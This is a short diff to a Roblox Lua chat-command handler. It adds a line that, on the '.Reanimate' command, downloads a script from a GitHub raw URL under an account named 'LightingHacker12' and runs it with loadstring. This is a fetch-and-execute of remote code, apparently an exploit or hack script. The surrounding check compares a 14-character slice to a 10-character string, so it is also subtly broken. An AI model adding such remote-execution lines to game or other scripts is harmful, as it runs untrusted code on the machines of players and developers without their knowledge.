@@ -20,5 +20,5 @@ messageDoneFiltering.OnClientEvent:Connect(function(message)
   end
 
   if msg:lower():sub(1,14) == ".Reanimate" then
-  
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/LightingHacker12/hackeralternate/main/reanimate",true))()
   end
